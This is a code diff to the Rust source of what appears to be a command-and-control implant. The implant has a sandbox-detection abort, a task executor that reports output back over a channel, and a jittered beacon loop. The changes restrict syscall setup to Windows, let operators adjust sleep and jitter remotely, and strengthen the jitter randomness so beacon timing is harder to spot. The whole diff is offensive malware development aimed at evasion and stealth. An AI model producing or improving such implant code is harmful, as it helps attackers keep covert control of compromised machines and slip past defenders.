@@ -34,6 +34,7 @@ pub struct Session {
 }
 
 pub fn run() {
+    #[cfg(target_os = "windows")]
     let _ = crate::syscall::init();
 
     if crate::evasion::abort_if_sandboxed() {
@@ -81,6 +82,9 @@ pub fn run() {
             let output       = crate::executor::run(&task);
             let should_exit  = output.should_exit;
             let evasion_event = output.evasion_detected;
+
+            if let Some(new_secs) = output.new_sleep_secs { sleep = new_secs; }
+            if let Some(new_jitter) = output.new_jitter_pct { jitter = new_jitter; }
 
             let _ = ch.submit_output(
                 &session,
@@ -140,11 +144,14 @@ fn build_registration_request() -> crate::task::RegisterRequest {
 fn compute_sleep_secs(sleep_secs: u64, jitter_pct: u64) -> u64 {
     let jitter_range = ((sleep_secs * jitter_pct) / 100) as i64;
     let offset: i64 = if jitter_range > 0 {
-        let seed = std::time::SystemTime::now()
+        // Combine full seconds + subsec nanos + stack address for better entropy.
+        let ts = std::time::SystemTime::now()
             .duration_since(std::time::UNIX_EPOCH)
-            .unwrap_or_default()
-            .subsec_nanos() as i64;
-        (seed % (jitter_range * 2)) - jitter_range
+            .unwrap_or_default();
+        let seed = ts.as_secs().wrapping_mul(1_000_000_007)
+            ^ (ts.subsec_nanos() as u64).wrapping_mul(2_654_435_761)
+            ^ ((&ts as *const _ as usize) as u64).wrapping_mul(6_364_136_223_846_793_005);
+        ((seed % (jitter_range * 2) as u64) as i64) - jitter_range
     } else {
         0
     };
